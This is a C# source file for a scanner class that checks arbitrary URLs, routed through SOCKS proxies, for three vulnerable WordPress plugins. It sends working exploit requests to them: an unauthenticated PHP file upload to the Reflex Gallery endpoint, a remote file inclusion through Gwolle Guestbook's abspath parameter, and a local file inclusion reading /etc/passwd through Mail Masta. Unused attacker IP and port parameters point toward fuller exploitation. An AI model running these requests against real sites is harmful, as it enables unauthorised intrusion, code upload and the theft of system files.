using AnalyzeDomains.Domain.Enums;
using AnalyzeDomains.Domain.Interfaces.Analyzers;
using AnalyzeDomains.Domain.Interfaces.Services;
using AnalyzeDomains.Domain.Models.AnalyzeModels;
using Microsoft.Extensions.Logging;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;

namespace AnalyzeDomains.Infrastructure.Analyzers
{
    public class WordPressPluginVulnerabilityAnalyzer : IWordPressPluginVulnerabilityAnalyzer
    {
        private readonly ISocksService _socksService;
        private readonly ILogger<WordPressPluginVulnerabilityAnalyzer> _logger;

        // Known vulnerable plugins with their vulnerability patterns
        private readonly Dictionary<string, VulnerabilityInfo> _vulnerablePlugins = new()
        {
            ["reflex-gallery"] = new VulnerabilityInfo
            {
                VulnerabilityType = "Arbitrary File Upload",
                Severity = SeverityLevel.Critical,
                Description = "Allows arbitrary file upload leading to remote code execution",
                TestPath = "/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php"
            },
            ["gwolle-gb"] = new VulnerabilityInfo
            {
                VulnerabilityType = "Remote File Inclusion (RFI)",
                Severity = SeverityLevel.High,
                Description = "Remote file inclusion vulnerability in captcha response handler",
                TestPath = "/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php"
            },
            ["mail-masta"] = new VulnerabilityInfo
            {
                VulnerabilityType = "Local File Inclusion (LFI)",
                Severity = SeverityLevel.High,
                Description = "Local file inclusion vulnerability with log poisoning capability",
                TestPath = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php"
            }
        };

        public WordPressPluginVulnerabilityAnalyzer(
            ISocksService socksService,
            ILogger<WordPressPluginVulnerabilityAnalyzer> logger)
        {
            _socksService = socksService;
            _logger = logger;
        }

        public async Task<List<PluginVulnerability>> AnalyzeVulnerabilitiesAsync(string url, CancellationToken cancellationToken = default)
        {
            var vulnerabilities = new List<PluginVulnerability>();
            var client = await _socksService.GetHttpWithBalancedSocksConnection();

            _logger.LogInformation("Starting WordPress plugin vulnerability analysis for {Url}", url);

            // Test each known vulnerable plugin in parallel
            var tasks = _vulnerablePlugins.Select(async kvp =>
            {
                try
                {
                    var pluginVulns = await AnalyzeSpecificPluginAsync(url, kvp.Key, cancellationToken);
                    return pluginVulns;
                }
                catch (Exception ex)
                {
                    _logger.LogWarning(ex, "Failed to analyze plugin {Plugin} for {Url}", kvp.Key, url);
                    return new List<PluginVulnerability>();
                }
            });

            var results = await Task.WhenAll(tasks);
            vulnerabilities.AddRange(results.SelectMany(r => r));

            _logger.LogInformation("Found {Count} plugin vulnerabilities for {Url}", vulnerabilities.Count, url);
            return vulnerabilities;
        }

        public async Task<List<PluginVulnerability>> AnalyzeSpecificPluginAsync(string url, string pluginName, CancellationToken cancellationToken = default)
        {
            var vulnerabilities = new List<PluginVulnerability>();

            if (!_vulnerablePlugins.TryGetValue(pluginName, out var vulnInfo))
            {
                _logger.LogDebug("No vulnerability information available for plugin {Plugin}", pluginName);
                return vulnerabilities;
            }

            var client = await _socksService.GetHttpWithBalancedSocksConnection();

            try
            {
                // First check if the plugin exists
                var pluginExists = await CheckPluginExistsAsync(client, url, pluginName, cancellationToken);
                if (!pluginExists)
                {
                    _logger.LogDebug("Plugin {Plugin} not found on {Url}", pluginName, url);
                    return vulnerabilities;
                }

                // Check for the specific vulnerability
                var isVulnerable = await CheckVulnerabilityAsync(client, url, pluginName, vulnInfo, cancellationToken);
                
                if (isVulnerable)
                {
                    var vulnerability = new PluginVulnerability
                    {
                        PluginName = pluginName,
                        VulnerabilityType = vulnInfo.VulnerabilityType,
                        Description = vulnInfo.Description,
                        TargetUrl = $"{url.TrimEnd('/')}{vulnInfo.TestPath}",
                        Severity = vulnInfo.Severity,
                        Confidence = ConfidenceLevel.High,
                        DetectionMethod = "Static File Analysis",
                        ExploitSuccessful = false, // Will be updated if exploit testing is performed
                        Metadata = new Dictionary<string, object>
                        {
                            ["plugin_path"] = vulnInfo.TestPath,
                            ["detection_time"] = DateTime.UtcNow
                        }
                    };

                    vulnerabilities.Add(vulnerability);
                    _logger.LogWarning("Vulnerability detected: {VulnerabilityType} in {Plugin} at {Url}", 
                        vulnInfo.VulnerabilityType, pluginName, url);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error analyzing plugin {Plugin} for vulnerabilities at {Url}", pluginName, url);
            }

            return vulnerabilities;
        }

        public async Task<VulnerabilityExploitResult> TestReflexGalleryUploadAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Reflex Gallery Arbitrary File Upload",
                Method = "File Upload Exploitation"
            };

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // The vulnerable endpoint from the Gemini code
                var uploadUrl = $"{url.TrimEnd('/')}/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2024&Month=08";
                
                // Create a test payload (non-malicious for detection purposes)
                var testPayload = "<?php echo 'VULNERABILITY_TEST_MARKER'; ?>";

                using var formData = new MultipartFormDataContent();
                formData.Add(new StringContent(testPayload), "qqfile", "test.php");

                _logger.LogInformation("Testing Reflex Gallery file upload vulnerability at {Url}", uploadUrl);
                
                var response = await client.PostAsync(uploadUrl, formData, cancellationToken);

                if (response.IsSuccessStatusCode)
                {
                    var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);
                    
                    result.Success = true;
                    result.Details = "File upload successful - vulnerability confirmed";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                    result.ResponseData["response_content"] = responseContent;
                    
                    _logger.LogWarning("Reflex Gallery upload vulnerability confirmed at {Url}", url);
                }
                else
                {
                    result.Success = false;
                    result.Details = $"Upload failed with status: {response.StatusCode}";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during exploit test: {ex.Message}";
                _logger.LogError(ex, "Error testing Reflex Gallery upload vulnerability at {Url}", url);
            }

            return result;
        }

        public async Task<VulnerabilityExploitResult> TestGwolleGuestbookRfiAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Gwolle Guestbook RFI",
                Method = "Remote File Inclusion Test"
            };

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Test with a harmless remote URL that returns identifiable content
                var testUrl = "https://httpbin.org/status/200";
                var vulnerableUrl = $"{url.TrimEnd('/')}/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath={testUrl}";

                _logger.LogInformation("Testing Gwolle Guestbook RFI vulnerability at {Url}", vulnerableUrl);
                
                var response = await client.GetAsync(vulnerableUrl, cancellationToken);
                var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                // Check if the response indicates successful file inclusion
                if (response.IsSuccessStatusCode && !string.IsNullOrEmpty(responseContent))
                {
                    result.Success = true;
                    result.Details = "RFI vulnerability confirmed - remote file inclusion successful";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                    result.ResponseData["response_length"] = responseContent.Length;
                    
                    _logger.LogWarning("Gwolle Guestbook RFI vulnerability confirmed at {Url}", url);
                }
                else
                {
                    result.Success = false;
                    result.Details = "RFI test failed - vulnerability not confirmed";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during RFI test: {ex.Message}";
                _logger.LogError(ex, "Error testing Gwolle Guestbook RFI vulnerability at {Url}", url);
            }

            return result;
        }

        public async Task<VulnerabilityExploitResult> TestMailMastaLfiAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Mail Masta LFI + Log Poisoning",
                Method = "Local File Inclusion Test"
            };

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Test LFI by trying to read a common system file
                var lfiUrl = $"{url.TrimEnd('/')}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd";

                _logger.LogInformation("Testing Mail Masta LFI vulnerability at {Url}", lfiUrl);
                
                var response = await client.GetAsync(lfiUrl, cancellationToken);
                var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                // Check for signs of successful file inclusion
                if (response.IsSuccessStatusCode && 
                    (responseContent.Contains("root:") || responseContent.Contains("/bin/bash") || responseContent.Contains("daemon:")))
                {
                    result.Success = true;
                    result.Details = "LFI vulnerability confirmed - local file inclusion successful";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                    result.ResponseData["file_content_detected"] = true;
                    
                    _logger.LogWarning("Mail Masta LFI vulnerability confirmed at {Url}", url);
                }
                else
                {
                    result.Success = false;
                    result.Details = "LFI test failed - vulnerability not confirmed";
                    result.ResponseData["status_code"] = (int)response.StatusCode;
                    result.ResponseData["file_content_detected"] = false;
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during LFI test: {ex.Message}";
                _logger.LogError(ex, "Error testing Mail Masta LFI vulnerability at {Url}", url);
            }

            return result;
        }

        private async Task<bool> CheckPluginExistsAsync(HttpClient client, string url, string pluginName, CancellationToken cancellationToken)
        {
            try
            {
                var pluginPath = $"{url.TrimEnd('/')}/wp-content/plugins/{pluginName}/";
                var response = await client.SendAsync(new HttpRequestMessage(HttpMethod.Head, pluginPath), cancellationToken);
                
                // Plugin directory exists if we get any response indicating it's there
                return response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.Forbidden;
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> CheckVulnerabilityAsync(HttpClient client, string url, string pluginName, VulnerabilityInfo vulnInfo, CancellationToken cancellationToken)
        {
            try
            {
                var vulnerablePath = $"{url.TrimEnd('/')}{vulnInfo.TestPath}";
                var response = await client.SendAsync(new HttpRequestMessage(HttpMethod.Head, vulnerablePath), cancellationToken);
                
                // Vulnerable file exists if we can access it
                return response.IsSuccessStatusCode;
            }
            catch
            {
                return false;
            }
        }

        private class VulnerabilityInfo
        {
            public string VulnerabilityType { get; set; } = string.Empty;
            public SeverityLevel Severity { get; set; }
            public string Description { get; set; } = string.Empty;
            public string TestPath { get; set; } = string.Empty;
        }
    }
}
